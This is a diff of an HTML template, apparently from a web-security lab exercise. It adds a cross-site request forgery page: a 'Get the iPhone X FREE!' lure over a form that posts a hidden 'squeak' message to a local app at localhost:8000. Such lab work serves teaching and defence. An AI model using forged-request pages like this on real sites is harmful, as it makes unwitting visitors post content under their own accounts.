@@ -20,8 +20,14 @@
         <h2>Get the iPhone X FREE!</h2>
     </div>
 
-    <form class="mt-2" action="/attack" method="POST">
-        
+    <form class="mt-2" action="http://localhost:8000/home" method="POST">
+        <input
+            type="hidden"
+            name="squeak"
+            class="form-control"
+            id="squeak"
+            value="Click {{data}} to get the iPhone X Free!"
+        />
 
 
         <div class="form-group offset-4 row">
